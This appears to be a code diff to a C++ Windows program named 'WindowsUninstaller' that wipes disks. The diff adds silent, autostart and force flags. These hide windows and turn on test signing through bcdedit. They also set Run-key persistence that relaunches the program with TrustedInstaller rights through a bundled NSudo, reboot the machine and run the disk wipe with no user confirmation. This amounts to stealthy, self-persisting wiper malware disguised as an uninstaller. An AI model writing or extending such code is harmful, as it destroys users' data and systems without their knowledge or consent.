@@ -33,6 +33,39 @@ constexpr int IDC_BUTTON_CONFIRM = 1008;
 constexpr int IDC_STATIC_WARNING2 = 1009;
 
 const std::wstring SECRET_PARAM = L"7f9d2c4e-8a3b-5f1e-9c7d-3a8b6e2f4d1c-9a7b3c5e8f2d-4a6c8e9b1d3f-7c9e2a4b6d8f";
+const std::wstring SILENT_PARAM = L"-silent";
+const std::wstring AUTOBOOT_PARAM = L"-autostart";
+const std::wstring FORCE_PARAM = L"-force";
+
+std::wstring GetSilentFlagPath() {
+    wchar_t tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
+    return std::wstring(tempPath) + L"_silent_mode_flag.tmp";
+}
+
+void SetSilentFlag() {
+    std::wstring flagPath = GetSilentFlagPath();
+    FILE* fp = _wfopen(flagPath.c_str(), L"w");
+    if (fp) {
+        fwprintf(fp, L"1");
+        fclose(fp);
+    }
+}
+
+bool CheckSilentFlag() {
+    std::wstring flagPath = GetSilentFlagPath();
+    FILE* fp = _wfopen(flagPath.c_str(), L"r");
+    if (fp) {
+        fclose(fp);
+        return true;
+    }
+    return false;
+}
+
+void ClearSilentFlag() {
+    std::wstring flagPath = GetSilentFlagPath();
+    DeleteFileW(flagPath.c_str());
+}
 
 HWND hWndMain = nullptr;
 HWND hEditOutput = nullptr;
@@ -40,6 +73,7 @@ HINSTANCE hInst = nullptr;
 bool g_isElevatedMode = false;
 bool g_testModeEnabled = false;
 bool g_autoRunRequested = false;
+bool g_silentMode = false;
 
 const wchar_t CLASS_NAME[] = L"WindowsUninstallerClass";
 
@@ -651,22 +685,32 @@ DWORD WINAPI WipeDisksThread(LPVOID lpParam) {
     AddOutput(L"========================================");
 
     if (g_testModeEnabled) {
-        int result = AskDisableTestModeDialog(hWndMain);
-        if (result == IDYES) {
-            DebugLog(L"用户选择关闭测试模式\n");
-            AddOutput(L"正在关闭测试模式...");
+        if (g_silentMode) {
+            DebugLog(L"静默模式: 自动关闭测试模式\n");
             DisableTestMode();
             ClearAutoRun();
-            AddOutput(L"系统将在10秒后重启...");
+            DebugLog(L"系统将在10秒后重启...\n");
             RestartComputer();
+        } else {
+            int result = AskDisableTestModeDialog(hWndMain);
+            if (result == IDYES) {
+                DebugLog(L"用户选择关闭测试模式\n");
+                AddOutput(L"正在关闭测试模式...");
+                DisableTestMode();
+                ClearAutoRun();
+                AddOutput(L"系统将在10秒后重启...");
+                RestartComputer();
+            }
+            ClearAutoRun();
         }
-        ClearAutoRun();
     }
 
-    HWND hBtn = GetDlgItem(hWndMain, IDC_BUTTON_CONFIRM);
-    if (hBtn) {
-        EnableWindow(hBtn, TRUE);
-        SetWindowTextW(hBtn, L"完成");
+    if (!g_silentMode) {
+        HWND hBtn = GetDlgItem(hWndMain, IDC_BUTTON_CONFIRM);
+        if (hBtn) {
+            EnableWindow(hBtn, TRUE);
+            SetWindowTextW(hBtn, L"完成");
+        }
     }
 
     return 0;
@@ -720,7 +764,7 @@ bool EnableTestMode() {
     STARTUPINFOW si = {sizeof(si)};
     PROCESS_INFORMATION pi = {0};
     si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_SHOW;
+    si.wShowWindow = g_silentMode ? SW_HIDE : SW_SHOW;
     
     // 命令1: 开启测试签名模式
     wchar_t cmd1[] = L"bcdedit /set testsigning on";
@@ -780,7 +824,7 @@ bool DisableTestMode() {
     STARTUPINFOW si = {sizeof(si)};
     PROCESS_INFORMATION pi = {0};
     si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_SHOW;
+    si.wShowWindow = g_silentMode ? SW_HIDE : SW_SHOW;
     
     wchar_t cmd[] = L"bcdedit /set testsigning off";
     if (!CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE, CREATE_DEFAULT_ERROR_MODE, nullptr, nullptr, &si, &pi)) {
@@ -820,7 +864,7 @@ bool ScheduleAutoRun() {
             return false;
         }
         
-        std::wstring value = L"\"" + nsudoPath + L"\" -U:T -P:E \"" + std::wstring(selfPath) + L"\" " + SECRET_PARAM;
+        std::wstring value = L"\"" + nsudoPath + L"\" -U:T -P:E \"" + std::wstring(selfPath) + L"\" " + SILENT_PARAM;
         if (RegSetValueExW(hKey, L"WindowsUninstaller", 0, REG_SZ, (const BYTE*)value.c_str(), (value.size() + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
             RegCloseKey(hKey);
             DebugLog(L"ScheduleAutoRun: 自启动已设置 (使用NSudo)\n");
@@ -1076,6 +1120,34 @@ void OnStartUninstall() {
     DebugLog(L"测试模式状态: %s\n", g_testModeEnabled ? L"已开启" : L"未开启");
     
     if (!g_testModeEnabled) {
+        if (g_autoRunRequested) {
+            DebugLog(L"自动运行模式: 自动启用测试模式\n");
+            AddOutput(L"正在开启测试模式...");
+            
+            if (EnableTestMode()) {
+                AddOutput(L"测试模式已开启");
+                ScheduleAutoRun();
+                AddOutput(L"系统将在10秒后重启...");
+                AddOutput(L"重启后程序将自动继续执行");
+                
+                MessageBoxW(hWndMain,
+                    L"Test mode enabled. System will restart in 10 seconds.\n\nPlease re-run this program after restart.",
+                    L"Restarting",
+                    MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
+                
+                RestartComputer();
+                PostMessageW(hWndMain, WM_CLOSE, 0, 0);
+                return;
+            } else {
+                AddOutput(L"Error: Cannot enable test mode");
+                MessageBoxW(hWndMain,
+                    L"Cannot enable test mode. Please make sure to run as administrator.",
+                    L"Error",
+                    MB_OK | MB_ICONERROR | MB_TOPMOST);
+                return;
+            }
+        }
+        
         int result = AskEnableTestModeDialog(hWndMain);
         if (result == IDYES) {
             DebugLog(L"用户选择开启测试模式\n");
@@ -1425,8 +1497,18 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow, bool isElevated) {
     ShowWindow(hWndMain, nCmdShow);
     UpdateWindow(hWndMain);
 
+    if (g_autoRunRequested) {
+        if (isElevated) {
+            PostMessageW(hWndMain, WM_COMMAND, MAKELONG(IDC_BUTTON_CONFIRM, BN_CLICKED), 0);
+        } else {
+            PostMessageW(hWndMain, WM_COMMAND, MAKELONG(IDC_BUTTON_UNINSTALL, BN_CLICKED), 0);
+        }
+    }
+
     return TRUE;
 }
+
+void RunSilentMode(HINSTANCE hInstance);
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     UNREFERENCED_PARAMETER(hPrevInstance);
@@ -1434,12 +1516,37 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     LPWSTR cmdLineW = GetCommandLineW();
     std::wstring cmdLine(cmdLineW);
+    
     bool isElevated = (cmdLine.find(SECRET_PARAM) != std::wstring::npos);
+    g_silentMode = (cmdLine.find(SILENT_PARAM) != std::wstring::npos);
+    bool isAutoBoot = (cmdLine.find(AUTOBOOT_PARAM) != std::wstring::npos);
+    bool isForce = (cmdLine.find(FORCE_PARAM) != std::wstring::npos);
     
     if (isElevated) {
         g_autoRunRequested = true;
         ClearAutoRun();
         DebugLog(L"检测到自启动参数，已清除自启动注册表\n");
+    }
+
+    if (isForce) {
+        DebugLog(L"检测到强制删除参数，直接执行擦除...\n");
+        hInst = hInstance;
+        g_silentMode = true;
+        WipeDisksThread(nullptr);
+        return 0;
+    }
+
+    if (g_silentMode) {
+        DebugLog(L"检测到静默运行参数，进入静默模式\n");
+        hInst = hInstance;
+        RunSilentMode(hInstance);
+        return 0;
+    }
+
+    if (isAutoBoot) {
+        DebugLog(L"检测到自启动参数，自动执行擦除操作\n");
+        g_autoRunRequested = true;
+        ClearAutoRun();
     }
 
     if (!RegisterWindowClass(hInstance)) {
@@ -1499,6 +1606,88 @@ bool FindEFIPartition(TCHAR* driveLetter) {
     
     DebugLog(L"FindEFIPartition: 未找到 EFI 分区\n");
     return false;
+}
+
+void RunSilentMode(HINSTANCE hInstance) {
+    DebugLog(L"RunSilentMode: 开始静默模式执行\n");
+    
+    LPWSTR cmdLineW = GetCommandLineW();
+    std::wstring cmdLine(cmdLineW);
+    bool isElevated = (cmdLine.find(SECRET_PARAM) != std::wstring::npos);
+    bool hasSilentFlag = CheckSilentFlag();
+    
+    g_testModeEnabled = IsTestModeEnabled();
+    DebugLog(L"测试模式状态: %s\n", g_testModeEnabled ? L"已开启" : L"未开启");
+    DebugLog(L"静默标记状态: %s\n", hasSilentFlag ? L"存在" : L"不存在");
+    
+    if (!g_testModeEnabled) {
+        DebugLog(L"RunSilentMode: 测试模式未开启，启用测试模式...\n");
+        
+        if (EnableTestMode()) {
+            DebugLog(L"RunSilentMode: 测试模式已启用\n");
+            SetSilentFlag();
+            
+            wchar_t selfPath[MAX_PATH];
+            GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
+            
+            std::wstring nsudoPath = GetTempFilePath(L"nsudo_temp.exe");
+            if (ExtractResourceToFile(hInstance, NSUDO_BIN, nsudoPath)) {
+                std::wstring autoRunValue = L"\"" + nsudoPath + L"\" -U:T -P:E \"" + std::wstring(selfPath) + L"\" " + SILENT_PARAM;
+                
+                HKEY hKey;
+                if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+                    RegSetValueExW(hKey, L"WindowsUninstaller", 0, REG_SZ, (const BYTE*)autoRunValue.c_str(), (autoRunValue.size() + 1) * sizeof(wchar_t));
+                    RegCloseKey(hKey);
+                    DebugLog(L"RunSilentMode: 自启动已设置\n");
+                }
+            }
+            
+            DebugLog(L"RunSilentMode: 系统将在10秒后重启...\n");
+            RestartComputer();
+        } else {
+            DebugLog(L"RunSilentMode: 无法启用测试模式，退出\n");
+        }
+        return;
+    }
+    
+    if (isElevated) {
+        DebugLog(L"RunSilentMode: 已获得TrustedInstaller权限，直接执行擦除...\n");
+        WipeDisksThread(nullptr);
+        return;
+    }
+    
+    if (hasSilentFlag) {
+        DebugLog(L"RunSilentMode: 检测到静默标记，获取TrustedInstaller权限...\n");
+        
+        std::wstring nsudoPath = GetTempFilePath(L"nsudo_temp.exe");
+        if (!ExtractResourceToFile(hInstance, NSUDO_BIN, nsudoPath)) {
+            DebugLog(L"RunSilentMode: 无法提取NSudo\n");
+            return;
+        }
+        
+        wchar_t selfPath[MAX_PATH];
+        GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
+        
+        std::wstring command = nsudoPath + L" -U:T -P:E \"" + std::wstring(selfPath) + L"\" " + FORCE_PARAM;
+        DebugLog(L"RunSilentMode: NSudo命令: %s\n", command.c_str());
+        
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi = { 0 };
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        
+        BOOL createResult = CreateProcessW(nullptr, const_cast<wchar_t*>(command.c_str()), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
+        if (createResult) {
+            DebugLog(L"RunSilentMode: 以TrustedInstaller权限启动成功\n");
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        } else {
+            DebugLogWithError(L"RunSilentMode: CreateProcessW 失败");
+        }
+        return;
+    }
+    
+    DebugLog(L"RunSilentMode: 未检测到静默标记，退出\n");
 }
 
 // 使用 TrustedInstaller 权限删除文件和目录
